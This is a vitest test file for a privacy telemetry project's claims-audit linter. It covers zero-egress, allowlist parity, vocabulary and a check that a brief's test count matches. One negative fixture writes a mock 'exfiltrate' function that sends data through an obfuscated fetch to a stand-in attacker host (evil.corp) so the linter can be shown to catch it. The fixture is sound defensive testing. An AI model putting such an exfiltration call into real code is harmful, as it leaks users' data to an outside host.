import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, it, expect } from 'vitest';
import {
  auditZeroEgress,
  auditAllowlistParity,
  auditDynamicClaims,
  auditHandoffProtocol,
  auditVocabulary,
  auditCentralPackageManagement,
  auditPortfolioMasterBrief,
} from '../../../scripts/audit-claims.mjs';

describe('Privacy Telemetry Claims & Invariant Linter Suite', () => {
  it('enforces zero-egress air-gap and default memory_only invariants', () => {
    const errors: string[] = [];
    auditZeroEgress(errors);
    expect(errors).toEqual([]);

    // Negative fixture: reject computed fetch outside exportToOtlp while preserving exemption
    const tempDir = mkdtempSync(join(tmpdir(), 'kty-zero-egress-'));
    try {
      const mockExporter = join(tempDir, 'exporter.ts');
      writeFileSync(
        mockExporter,
        'export async function exportToOtlp() {\n  await fetch("http://collector:4318");\n}\n'
      );
      const mockLeak = join(tempDir, 'leak.ts');
      writeFileSync(
        mockLeak,
        'export function exfiltrate() {\n  globalThis["fetch"]("https://evil.corp/telemetry");\n}\n'
      );

      const computedErrors: string[] = [];
      auditZeroEgress(computedErrors, {
        overrideSrcDir: tempDir,
        overrideAuthorizedExporterPath: mockExporter,
      });

      const fetchViolations = computedErrors.filter((e) =>
        e.includes('fetch detected in non-exporter source')
      );
      expect(fetchViolations).toHaveLength(1);
      expect(fetchViolations[0]).toContain('leak.ts:2');
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('enforces telemetry allowlist integrity and redaction parity between TS and .NET', () => {
    const errors: string[] = [];
    auditAllowlistParity(errors);
    expect(errors).toEqual([]);
  });

  it('enforces single source of truth for honest dynamic privacy claims', () => {
    const errors: string[] = [];
    auditDynamicClaims(errors);
    expect(errors).toEqual([]);
  });

  it('enforces cross-engine structured handoff protocol tool and category coverage', () => {
    const errors: string[] = [];
    auditHandoffProtocol(errors);
    expect(errors).toEqual([]);
  });

  it('enforces vocabulary guardrails eliminating unprovable marketing claims', () => {
    const errors: string[] = [];
    auditVocabulary(errors);
    expect(errors).toEqual([]);
  });

  it('enforces Central Package Management (CPM) and fail-closed NuGet audit configuration', () => {
    const errors: string[] = [];
    auditCentralPackageManagement(errors);
    expect(errors).toEqual([]);
  });

  it('enforces Portfolio Master Brief test count parity', () => {
    const errors: string[] = [];
    const checked = auditPortfolioMasterBrief(errors, { requireBrief: false });
    expect(errors).toEqual([]);
    expect(typeof checked).toBe('boolean');

    // Positive test: controlled brief fixture
    const tempBriefDir = mkdtempSync(join(tmpdir(), 'kty-brief-'));
    try {
      const mockBriefPath = join(tempBriefDir, 'MOCK_BRIEF.md');
      writeFileSync(
        mockBriefPath,
        '| **`privacy-telemetry`** | TS/React (>=18), .NET 10 | Shared Core | 27/27 tests pass (21 TS + 6 .NET) |\n'
      );
      const fixtureErrors: string[] = [];
      const fixtureChecked = auditPortfolioMasterBrief(fixtureErrors, {
        requireBrief: true,
        overrideBriefPath: mockBriefPath,
      });
      expect(fixtureErrors).toEqual([]);
      expect(fixtureChecked).toBe(true);
    } finally {
      rmSync(tempBriefDir, { recursive: true, force: true });
    }

    // Negative test: brief required but missing
    const missingErrors: string[] = [];
    const missingChecked = auditPortfolioMasterBrief(missingErrors, {
      requireBrief: true,
      overrideBriefPath: '/non-existent/path/BRIEF.md',
    });
    expect(missingChecked).toBe(false);
    expect(missingErrors.length).toBeGreaterThan(0);
    expect(missingErrors[0]).toContain('not found but required via --require-brief');
  });
});
